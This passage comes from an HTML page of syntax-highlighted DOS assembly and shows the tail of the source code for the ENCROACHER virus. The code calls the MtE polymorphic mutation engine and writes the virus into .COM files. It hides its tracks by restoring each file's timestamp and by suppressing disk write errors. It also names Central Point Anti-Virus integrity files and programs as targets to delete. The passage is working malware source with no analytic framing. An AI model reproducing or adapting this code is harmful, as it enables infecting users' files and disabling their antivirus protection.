    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">new_cod</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700</span><span class="sc0">                 </span><span class="sc1">;Save file's date/time</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data_top</span><span class="sc4">+</span><span class="sc2">0f</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">;Now call the Mutation Engine</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">         </span><span class="sc1">;dx points to start of ENCROACHER</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_DATA</span><span class="sc0">         </span><span class="sc1">;cx contains ENCROACHER length</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">  </span><span class="sc1">;bp contains address where MtE hands control to ENCROACH</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                   </span><span class="sc1">;si=0, MtE required value</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                   </span><span class="sc1">;di=0, MtE required value</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">0f</span><span class="sc0">                   </span><span class="sc1">;bl=0f,MtE 'medium' model required</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">101</span><span class="sc0">                  </span><span class="sc1">;set bit-field in ax, MtE values</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mut_engine</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">;Make sure file length mod 256 = 0</span><span class="sc0">
    </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">                   </span><span class="sc1">;Put the virus into the file</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">;Write the JMP instruction</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_cod</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
</span><span class="sc5">write_done</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">;Restore file's date/time</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">read_done2</span><span class="sc0">

</span><span class="sc5">read_done</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3e</span><span class="sc0">                   </span><span class="sc1">;Close the file</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">infect_done</span><span class="sc0">             </span><span class="sc1">;in this case, no infection so </span><span class="sc0">
                    </span><span class="sc1">;try for another search</span><span class="sc0">
</span><span class="sc5">read_done2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3e</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit1</span><span class="sc0">                  </span><span class="sc1">;successfully infected file,</span><span class="sc0">
                       </span><span class="sc1">;jump to host execution</span><span class="sc0">
</span><span class="sc5">fail_err</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">;Critical error handler</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                   </span><span class="sc1">;protects ENCROACHER from exposing </span><span class="sc0">
    </span><span class="sc6">iret</span><span class="sc0">                           </span><span class="sc1">;itself on a write-protected disk</span><span class="sc0">
                       </span><span class="sc1">;or diskette</span><span class="sc0">

</span><span class="sc5">srchnam</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'*.COM'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">killfile</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc12">'CHKLIST.CPS'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;CPAV file integrity data archive</span><span class="sc0">
</span><span class="sc5">killfile2</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc12">'C:\CPAV\CPAV.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">;default location and name of</span><span class="sc0">
                    </span><span class="sc1">;CPAV master program</span><span class="sc0">
</span><span class="sc5">killfile3</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc12">'C:\CPAV\VSAFE.COM'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">;CPAV r/w resident protection program</span><span class="sc0">

</span><span class="sc5">old_cod</span><span class="sc4">:</span><span class="sc0">                               </span><span class="sc1">;Buffer to read first 3 bytes</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">new_cod</span><span class="sc4">:</span><span class="sc0">                               </span><span class="sc1">;Buffer to write first 3 bytes</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">100</span><span class="sc0">

    </span><span class="sc9">.data</span><span class="sc0">

</span><span class="sc5">dotdot</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'..'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">;change directory trick</span><span class="sc0">
</span><span class="sc5">dta_buf</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">2bh</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">             </span><span class="sc1">;Buffer for DTA</span><span class="sc0">

    </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">start</span><span class="sc0">
</span></div></body>
</html>
